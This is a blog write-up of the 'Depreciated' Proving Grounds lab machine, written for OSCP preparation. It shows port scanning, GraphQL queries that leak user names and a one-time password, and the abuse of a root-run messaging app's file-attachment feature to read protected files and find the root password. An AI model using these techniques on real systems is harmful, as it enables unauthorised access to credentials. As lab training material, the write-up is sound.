---
title: Depreciated Box on Offensive Security Proving Grounds - OSCP Preparation.
tags: [oscp medium box, PG medium box, enumeration, graphql, misc, privilege escalation, linux]
categories: [OSCP, Proving Grounds]
comments: true
date: 2022-06-15 11:33:00
---

Hello,

Depreciated is a Medium box on Proving grounds, I first solved this box in January this year, you can find a PDF version of this blog here on [Github](https://github.com/bing0o/Write-ups/blob/main/Depreciated-PG-Practice.pdf): https://github.com/bing0o/Write-ups/blob/main/Depreciated-PG-Practice.pdf

## Enumeration:
### Nmap:

```bash
 ○ nmap -p- -vvv -T4 --open -Pn -oN nmap-all depreciated.pg
# Nmap 7.92 scan initiated Wed Jan 12 01:12:47 2022 as: nmap -p- -vvv -T4 --open -Pn -oN nmap-all depreciated.pg
Nmap scan report for depreciated.pg (192.168.192.170)
Host is up, received user-set (0.090s latency).
Scanned at 2022-01-12 01:12:47 CET for 112s
Not shown: 62159 closed tcp ports (conn-refused), 3372 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack
80/tcp   open  http    syn-ack
5132/tcp open  unknown syn-ack
8433/tcp open  unknown syn-ack

Read data files from: /usr/bin/../share/nmap
# Nmap done at Wed Jan 12 01:14:39 2022 -- 1 IP address (1 host up) scanned in 112.32 seconds
```

- Port `22` SSH.
- Port `80` HTTP Server.
- Port `5132` CLI Messaging Application.
- Port `8433` Werkzeug httpd 2.0.2 (Python 3.8.10).

### Exploring Open Ports
- Access port `80` and by reading the source code, it shows that there's a Graphql application running on port `8433`:

![image](/assets/img/sample/pg-depreciated/html-code.png)

- Checking on port `5132`:

![image](/assets/img/sample/pg-depreciated/nc-5132.png)

it looks like we need a username and an OTP (One Time Password) to login, we will get back to that later.

- Checking on port `8433`, we already know that we have `/graphql` on that port:

![image](/assets/img/sample/pg-depreciated/graphql.png)

### Getting OTP for User `peter`

- Let's Do Some Enumeration on `graphql`:
- Request:
```json
{
  listUsers
}
```

- Response:
```json
{
  "data": {
    "listUsers": "['peter', 'jason']"
  }
}
```

- Request:
```json
{
  getOTP(username:"peter")
}
```

- Response:
```json
{
  "data": {
    "getOTP": "Your One Time Password is: G8DSr9HGV9AW5lCg"
  }
}
```

Now we have an OTP for the user `peter`: `G8DSr9HGV9AW5lCg`

### Exploring CLI Messaging Application
- Let's try the User and OTP that we have on port `5132`:

![image](/assets/img/sample/pg-depreciated/nc-login.png)

and we are in :D

- the application allows you to list and read some messages, Let's explore it:

![image](/assets/img/sample/pg-depreciated/nc-explore.png)

- We Can't read most of the messages, but It looks like there's one we could read which reveals a password for the user `peter`, let's try to ssh:

![image](/assets/img/sample/pg-depreciated/ssh.png)


## Privilege Escalation:
### Enumeration
- Linpeas didn't give me much Information only that `Graphql` application on port `8433` is  running by root:

![image](/assets/img/sample/pg-depreciated/linpeas.png)

### Reading The Source Code

- Taking a look at the source code which we found on `/opt/depreciated/`.

All the functions seems useless only this one:

```python
def create_message(user):
    for_ = input("for: ")
    description = input("Description: ")
    num = random.randint(1000, 9999)
    author = user
    attachment = input("File: ")

    if attachment and attachment != "none" and os.path.exists(attachment):
        with open(attachment, 'r') as f:
            data = f.read()
        basename = '/opt/depreciated/' + os.path.basename(attachment)

        with open(basename, 'w') as f:
            f.write(data)
    else:
        attachment = "none"
    msg_info = {'id': num, 'author': author, 'description': description, 'for': for_, 'attachment': attachment}
    MESSAGES.append(msg_info)

    with open("/opt/depreciated/messaging/msg.json", 'w') as f:
         json.dump(MESSAGES, f)
```

which allows you to add an attachment file from the system to your message, and the application write the attachments to `/opt/depreciated/<FILE_NAME>`, this means if we attache `/etc/shadow` to a message, we will be able to access the `shadow` file at `/opt/depreciated/shadow` and its gonna be readable.


### Getting root

At first I tried to read `/root/proof.txt` file and it worked:

![image](/assets/img/sample/pg-depreciated/proof.png)

- The Result:
![image](/assets/img/sample/pg-depreciated/read-proof.png)

- Another thing come to my mind is that there's some messages we couldn't read before on port `5132`, let's try and read them:

![image](/assets/img/sample/pg-depreciated/read-msg.png)

The Result:
![image](/assets/img/sample/pg-depreciated/msg-pass.png)

- Switch user to root using that password:

![image](/assets/img/sample/pg-depreciated/root.png)


Happy Hacking!
